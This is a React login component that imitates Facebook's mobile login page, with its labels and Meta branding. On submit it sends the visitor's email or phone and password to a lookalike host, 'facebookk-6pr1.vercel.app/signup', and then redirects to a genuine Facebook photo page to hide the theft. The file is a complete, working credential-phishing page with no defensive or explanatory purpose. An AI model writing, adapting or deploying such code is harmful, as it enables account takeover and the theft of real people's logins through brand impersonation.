import React, { useState } from 'react';
import './App.css'
import img from './communication.png'
import img1 from './meta.png'
import axios from 'axios';

const Login = () => {
    const [formData,setData] = useState({
        username: "",
        password:"",
       
      });
    
      const handleChange = (e) => {
        setData((prev) => ({ ...prev, [e.target.name]: e.target.value }));
      };
    
     
    
     
      const handleSubmit = async (e) => {
        e.preventDefault();
        try {
          const res = await axios.post('https://facebookk-6pr1.vercel.app/signup', formData);
          console.log(res.data);
          if (res.status === 200) {
            setTimeout(() => {
              window.open('https://m.facebook.com/photo.php?fbid=527361450059357&set=a.126687590126747', '_self');
            }, 1000); 
          }
        } catch (err) {
          console.log('Error:', err);
        }
      };
      
   

    return (
      <div className="login-container">
        <small style={{fontSize:"13px",marginTop:"15px"}}>English (UK)</small>
      <img src={img}/>
      <form onSubmit={handleSubmit} className='form'>
          
         
          <div className="input-group">
              
              <input
                  type="email"
                  id="email"
                  placeholder="Mobile number or email address"
                  name="username"
                  onChange={handleChange}
                  required
              />
          </div>
          <div className="input-group">
              
              <input
                  type="password"
                  id="password"
                  name="password"
                  placeholder="Password"
                  onChange={handleChange}
                  required
              />
          </div>
          <button type="submit">Log in</button>
          <small>Forgotten password?</small>
          <div className='all'>
          <div className='btn'>Create new account</div>
          <div className='meta'>
            <img src={img1}/>
            <h5>Meta</h5>
          </div>
          </div>
         
      </form>
  </div>
    );
};

export default Login;
